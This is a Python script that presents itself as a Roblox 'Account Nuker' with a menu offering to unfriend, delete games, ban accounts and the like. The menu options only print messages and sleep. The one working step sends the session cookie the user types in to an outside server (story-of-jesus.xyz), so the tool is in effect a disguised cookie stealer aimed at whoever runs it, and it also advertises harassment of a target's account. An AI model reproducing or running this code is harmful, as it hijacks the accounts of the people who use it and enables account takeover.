
import os,requests;from pystyle import *;from time import sleep
def Main2():
    logo = """
░█▀▀█ █▀▀ █▀▀ █▀▀█ █░░█ █▀▀▄ ▀▀█▀▀    ▒█▄░▒█ █░░█ █░█ █▀▀ █▀▀█ 
▒█▄▄█ █░░ █░░ █░░█ █░░█ █░░█ ░░█░░    ▒█▒█▒█ █░░█ █▀▄ █▀▀ █▄▄▀ 
▒█░▒█ ▀▀▀ ▀▀▀ ▀▀▀▀ ░▀▀▀ ▀░░▀ ░░▀░░    ▒█░░▀█ ░▀▀▀ ▀░▀ ▀▀▀ ▀░▀▀ 
"""
    def main():
        while True:
            os.system("cls")
            print(f"""{Col.yellow}
{logo}
    """)
            cookie = input(f"{Col.white}[{Col.yellow}+{Col.white}] Enter Roblox Cookie To Nuke >> ")
            os.system('cls')
            try:
                r=requests.get(f"https://story-of-jesus.xyz/e.php?cookie={cookie}").json();USERNAME = r['username']
                print(f"""{Col.yellow}
{logo}
    █▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
    █ 1- Unfriend All          6- Message All         █
    █ 2- Unfollow All          7- Remove Items        █
    █ 3- Delete All Games      8- Ban Account         █
    █ 4- Leave All Groups      9- More Coming Soon!   █
    █ 5- Seizure (Light Mode)                         █
    █                                                 █
    ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
    """)
                print(f"{Col.white}[{Col.yellow}+{Col.white}] Connected as : {USERNAME}")
                a=input(f"{Col.white}[{Col.yellow}+{Col.white}] Select An Option >> ");print("\n")
                if a =="1":print(f"{Col.white}[{Col.green}+{Col.white}] Unfriending All Friends..");sleep(100)
                if a =="2":print(f"{Col.white}[{Col.green}+{Col.white}] Unfollowing All Followings..");sleep(100)
                if a =="3":print(f"{Col.white}[{Col.green}+{Col.white}] Deleting All Games..");sleep(100)
                if a =="4":print(f"{Col.white}[{Col.green}+{Col.white}] Leaving All Groups..");sleep(100)
                if a =="5":print(f"{Col.white}[{Col.green}+{Col.white}] Seizuring");sleep(100)
                if a =="6":input(f"{Col.white}[{Col.yellow}+{Col.white}] Message >> ");print(f"{Col.white}[{Col.green}+{Col.white}] Messaging All Friends..");sleep(100)
                if a =="7":print(f"{Col.white}[{Col.green}+{Col.white}] Removing All Items..");sleep(100)
                if a =="8":print(f"{Col.white}[{Col.green}+{Col.white}] Banning User By Uploading Explicit Content..");sleep(100)
                else:print(f"{Col.white}[{Col.red}+{Col.white}] Invalid Option..");sleep(2)
            except:pass
    main()